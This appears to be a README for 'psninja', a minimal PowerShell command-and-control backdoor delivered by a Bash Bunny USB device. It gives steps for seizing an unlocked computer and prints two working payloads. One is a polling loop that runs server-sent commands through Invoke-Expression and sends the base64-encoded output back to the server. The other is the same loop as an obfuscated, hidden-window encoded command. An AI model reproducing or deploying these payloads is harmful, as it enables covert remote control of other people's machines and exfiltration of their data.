# psninja
Minimalist script<br/>

The client loops get requests to the command server, which controls the client through the invoke-expression command

For bashbunny <br/>
Step1. change IP to your hostname on batgen.ps1 and run batgen.ps1 <br/>
Step2. Start control server <br/>
Step3. Insert USB into your unlocked computer you wish to control <br/>
 
(you may have to change the drive letters for this work correctly)

examples

while ($True){$i="127.0.0.1:5005";$a=Invoke-WebRequest -Method get "http://$i/cli";Write-Host $a;If($a.Content  -ne ""){$b=Invoke-Expression $a | Out-String;$c=[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b));$e="http://$i/hax/";$d=$e+$c;Invoke-WebRequest -Method get $d}Else{Invoke-WebRequest -Method get http://$i/}sleep 2} <br/>

powershell.exe -windowstyle hidden -enc dwBoAGkAbABlACAAKAAkAFQAcgB1AGUAKQB7AA0ACgAgACAAIAAgACAAIAAgAA0ACgAgACAAIAAgACQAYwBtAGQAMQAyADMAIAA9ACAAIABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAE0AZQB0AGgAbwBkACAAZwBlAHQAIAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADIAOgA1ADAAMAA1AC8AYwBsAGkAIgANAAoAIAAgACAAIABXAHIAaQB0AGUALQBIAG8AcwB0ACAAJABjAG0AZAAxADIAMwANAAoAIAAgACAAIABJAGYAIAAoACQAYwBtAGQAMQAyADMALgBDAG8AbgB0AGUAbgB0ACAAIAAtAG4AZQAgACIAIgApACAAewANAAoAIAAgACAAIAAgACAAIAAgACQAcABvAHMAdABfAGMAbQBkACAAPQAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACQAYwBtAGQAMQAyADMAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwANAAoAIAAgACAAIAAgACAAIAAgACQAYwBtAGQAXwBiAGEAcwBlADYANAAgAD0AIABbAEMAbwBuAHYAZQByAHQAXQA6ADoAVABvAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBuAGkAYwBvAGQAZQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcABvAHMAdABfAGMAbQBkACkAKQAgAA0ACgAgACAAIAAgACAAIAAgACAAJAB1AHIAaQAgAD0AIAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADIAOgA1ADAAMAA1AC8AaABhAHgALwAiAA0ACgAgACAAIAAgACAAIAAgACAAJAB1AHIAaQBfAGUAbgBjAG8AZABlAGQAIAA9ACAAIAAkAHUAcgBpACAAKwAgACAAJABjAG0AZABfAGIAYQBzAGUANgA0AA0ACgAgACAAIAAgACAAIAAgACAASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBNAGUAdABoAG8AZAAgAGcAZQB0ACAAJAB1AHIAaQBfAGUAbgBjAG8AZABlAGQADQAKACAAIAAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgAEUAbABzAGUAIAB7AA0ACgAgACAAIAAgACAAIAAgACAASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBNAGUAdABoAG8AZAAgAGcAZQB0ACAAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAuADEAMgA6ADUAMAAwADUALwANAAoAIAAgACAAIAB9AA0ACgBzAGwAZQBlAHAAIAAyAA0ACgANAAoAfQA=
